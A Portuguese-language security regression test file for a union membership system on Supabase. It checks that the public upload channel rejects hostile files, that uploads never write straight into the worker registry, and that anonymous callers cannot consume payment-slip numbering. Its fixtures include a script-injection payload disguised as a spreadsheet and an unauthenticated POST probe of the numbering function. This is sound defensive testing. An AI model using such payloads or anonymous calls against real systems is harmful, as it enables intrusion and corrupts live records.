      // Assinatura PK\x03\x04 correta, sem a entrada que só existe em OOXML.
      bytes: () => new Uint8Array([0x50, 0x4b, 0x03, 0x04, ...new Array(200).fill(0x41)]),
    },
    {
      nome: "arquivo vazio",
      arquivo: "quadro.xlsx",
      bytes: () => new Uint8Array(0),
    },
    {
      nome: "HTML com script, disfarçado de planilha",
      arquivo: "quadro.xlsx",
      bytes: () => new TextEncoder().encode('<html><script>alert(1)</script></html>'),
    },
  ];

  for (const caso of HOSTIS) {
    it(`recusa: ${caso.nome}`, async () => {
      const corpo = await enviarArquivo(token, caso.arquivo, caso.bytes());
      expect(corpo.ok, `arquivo hostil foi aceito: ${caso.nome}`).toBe(false);
      expect(corpo.remessa_id, "arquivo hostil virou remessa").toBeUndefined();
    });
  }

  it("recusa: planilha legítima com extensão errada (.csv)", async () => {
    const buffer = await gerarPlanilhaDoFormulario("99999999000199", [
      { nome: "DEMO — Legítima", cpf: "00123456797", telefone: "", piso: "1600,00", status: "sindicalizado" },
    ]);
    const corpo = await enviarArquivo(token, "quadro.csv", new Uint8Array(buffer as ArrayBuffer));
    expect(corpo.ok).toBe(false);
  });

  it("controle negativo: a planilha legítima É aceita — a recusa não é 'recusar tudo'", async () => {
    const buffer = await gerarPlanilhaDoFormulario("99999999000199", [
      { nome: "DEMO — Legítima", cpf: "00123456797", telefone: "", piso: "1600,00", status: "sindicalizado" },
    ]);
    const corpo = await enviarArquivo(token, "quadro.xlsx", new Uint8Array(buffer as ArrayBuffer));
    expect(corpo.ok, `planilha legítima foi recusada: ${corpo.erro}`).toBe(true);
    expect(corpo.remessa_id).toBeTruthy();
  });

  it("GARANTIA CENTRAL DA ETAPA: nem o envio aceito escreve em trabalhadores ou em vínculos", async () => {
    // A remessa vira cadastro só na 08.10, por clique da Denise. Se este caso
    // virar vermelho, o canal público passou a escrever direto na base
    // cadastral — que é a coisa que a etapa inteira foi desenhada para impedir.
    const admin = clienteServico();
    const antes = await admin.from("trabalhadores").select("id", { count: "exact", head: true });
    const antesVinculos = await admin.from("vinculos_empregaticios").select("id", { count: "exact", head: true });

    const buffer = await gerarPlanilhaDoFormulario("99999999000199", [
      { nome: "DEMO — Não deve virar cadastro", cpf: "11144477735", telefone: "", piso: "1600,00", status: "sindicalizado" },
    ]);
    const corpo = await enviarArquivo(token, "quadro.xlsx", new Uint8Array(buffer as ArrayBuffer));
    expect(corpo.ok).toBe(true);

    const depois = await admin.from("trabalhadores").select("id", { count: "exact", head: true });
    const depoisVinculos = await admin.from("vinculos_empregaticios").select("id", { count: "exact", head: true });
    expect(depois.count, "o canal público criou trabalhador").toBe(antes.count);
    expect(depoisVinculos.count, "o canal público criou vínculo empregatício").toBe(antesVinculos.count);
  });

  it("a remessa é imutável: a evidência do que chegou não se reescreve nem pelo Admin", async () => {
    const admin = clienteServico();
    const { data: remessa } = await admin
      .from("remessas_dados")
      .select("id, arquivo_path, ip_origem")
      .order("recebida_em", { ascending: false })
      .limit(1)
      .single();
    const { error } = await admin
      .from("remessas_dados")
      .update({ arquivo_path: "outro/caminho.xlsx" })
      .eq("id", remessa!.id);
    expect(error, "a coluna de evidência da remessa foi reescrita").not.toBeNull();
  });
});

// Este caso roda nos DOIS alvos porque mede sem consumir: a função é VOLATILE,
// e o PostgREST recusa VOLATILE por GET. O código de status separa "existe como
// endpoint e só falta o verbo certo" de "este papel não a executa" — o segundo
// é o estado que se quer. Sem esta separação, provar o achado em produção
// exigiria queimar um número de guia real.
describe("V2 — a numeração da guia de pagamento não pode ser endpoint público", () => {
  it("a função não está ao alcance da anon key", async () => {
    const r = await fetch(`${process.env.VITE_SUPABASE_URL}/rest/v1/rpc/fn_gera_guia_pagamento`, {
      headers: { apikey: ANON_KEY },
    });
    expect(
      r.status,
      `HTTP ${r.status}: a função da numeração responde à anon key — 405 significa que o endpoint ` +
        `existe e só falta trocar o verbo para POST. sql/23_hardening_08_12.sql fecha isto.`,
    ).not.toBe(405);
  });
});

bench("V2 — numeração de documento consumida pela API REST (bench)", () => {
  it("MEDIÇÃO: função que avança a sequência da guia de pagamento, chamada sem login", async () => {
    // Gêmeo do achado A-02 da ETAPA 07: lá a função da numeração da guia de
    // serviço saiu do alcance da API; a da guia de PAGAMENTO ficou. O caso mede
    // e vira regressão permanente depois da correção.
    const numeros: string[] = [];
    for (let i = 0; i < 3; i += 1) {
      const r = await fetch(`${process.env.VITE_SUPABASE_URL}/rest/v1/rpc/fn_gera_guia_pagamento`, {
        method: "POST",
        headers: { apikey: ANON_KEY, Authorization: `Bearer ${ANON_KEY}`, "Content-Type": "application/json" },
        body: "{}",
      });
      if (r.status === 200) numeros.push((await r.json()) as string);
    }
    console.log(`[numeração] anônimo obteve: ${numeros.join(", ") || "(nada)"}`);
    expect(
      numeros,
      `anônimo consumiu a numeração da guia de pagamento: ${numeros.join(", ")} — ` +
        `a próxima guia real nasce com o número queimado`,
    ).toEqual([]);
  });

  it("controle negativo: o motor de cobrança continua gerando guia", async () => {
    // A única chamadora legítima da função é `fn_gerar_guias`, que é SECURITY
    // DEFINER com dono `postgres` — revogar o EXECUTE de anon/authenticated não
    // pode quebrá-la. Este caso é o que prova isso, e é o mesmo tipo de controle
    // que faltou na ETAPA 07 quando o trigger INVOKER quebrou a Secretaria.
    const { client } = await loginComo("admin");
    const { error } = await client.rpc("fn_gerar_guias", {
      p_tipo: "contribuicao_sindical",
      p_competencia: "2026-01-01",
    } as never);
    expect(error, `o motor de cobrança quebrou: ${JSON.stringify(error)}`).toBeNull();
  });
});
